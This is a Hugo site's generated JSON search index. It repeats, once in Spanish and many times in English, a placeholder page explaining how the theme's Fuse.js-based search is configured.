[{"categories":null,"contents":"Este archivo existe únicamente para responder a la URL /search con la plantilla de diseño search relacionada.\nNo se muestra ningún contenido aquí, todo el contenido se basa en la plantilla layouts/page/search.html\nEstablecer una prioridad muy baja en el mapa del sitio le dirá a los motores de búsqueda que éste no es un contenido importante.\nEsta implementación utiliza Fusejs, jquery y mark.js\nConfiguración inicial La búsqueda depende del tipo de contenido de salida adicional de JSON en config.toml\n``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nBúsqueda de archivos adicionales Para buscar campos adicionales definidos en el front matter, debes añadirlo en 2 lugares.\nEditar layouts/_default/index.JSON Esto expone los valores en /index.json: por ejemplo, para agregar categories ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEditar las opciones de fuse.js para buscar static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"Este archivo existe únicamente para responder a la URL /search con la plantilla de diseño search relacionada.\nNo se muestra ningún contenido aquí, todo el contenido se basa en la plantilla layouts/page/search.html\nEstablecer una prioridad muy baja en el mapa del sitio le dirá a los motores de búsqueda que éste no es un contenido importante.\nEsta implementación utiliza Fusejs, jquery y mark.js\nConfiguración inicial La búsqueda depende del tipo de contenido de salida adicional de JSON en config.","tags":null,"title":"Resultados de Búsqueda"},{"categories":null,"contents":"Este archivo existe únicamente para responder a la URL /search con la plantilla de diseño search relacionada.\nNo se muestra ningún contenido aquí, todo el contenido se basa en la plantilla layouts/page/search.html\nEstablecer una prioridad muy baja en el mapa del sitio le dirá a los motores de búsqueda que éste no es un contenido importante.\nEsta implementación utiliza Fusejs, jquery y mark.js\nConfiguración inicial La búsqueda depende del tipo de contenido de salida adicional de JSON en config.toml\n``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nBúsqueda de archivos adicionales Para buscar campos adicionales definidos en el front matter, debes añadirlo en 2 lugares.\nEditar layouts/_default/index.JSON Esto expone los valores en /index.json: por ejemplo, para agregar categories ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEditar las opciones de fuse.js para buscar static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"Este archivo existe únicamente para responder a la URL /search con la plantilla de diseño search relacionada.\nNo se muestra ningún contenido aquí, todo el contenido se basa en la plantilla layouts/page/search.html\nEstablecer una prioridad muy baja en el mapa del sitio le dirá a los motores de búsqueda que éste no es un contenido importante.\nEsta implementación utiliza Fusejs, jquery y mark.js\nConfiguración inicial La búsqueda depende del tipo de contenido de salida adicional de JSON en config.","tags":null,"title":"Resultados de Búsqueda"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```","tags":null,"title":"Search Results"},{"categories":null,"contents":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a very low sitemap priority will tell search engines this is not important content.\nThis implementation uses Fusejs, jquery and mark.js\nInitial setup Search depends on additional output content type of JSON in config.toml ``` [outputs] home = [\u0026ldquo;HTML\u0026rdquo;, \u0026ldquo;JSON\u0026rdquo;] ```\nSearching additional fileds To search additional fields defined in front matter, you must add it in 2 places.\nEdit layouts/_default/index.JSON This exposes the values in /index.json i.e. add category ``` \u0026hellip; \u0026ldquo;contents\u0026rdquo;:{{ .Content | plainify | jsonify }} {{ if .Params.tags }}, \u0026ldquo;tags\u0026rdquo;:{{ .Params.tags | jsonify }}{{end}}, \u0026ldquo;categories\u0026rdquo; : {{ .Params.categories | jsonify }}, \u0026hellip; ```\nEdit fuse.js options to Search static/js/search.js ``` keys: [ \u0026ldquo;title\u0026rdquo;, \u0026ldquo;contents\u0026rdquo;, \u0026ldquo;tags\u0026rdquo;, \u0026ldquo;categories\u0026rdquo; ] ```\n","date":"June 8, 2010","hero":"/images/default-hero.jpg","permalink":"https://hugo-toha.github.io/search/","summary":"This file exists solely to respond to /search URL with the related search layout template.\nNo content shown here is rendered, all content is based in the template layouts/page/search.html\nSetting a 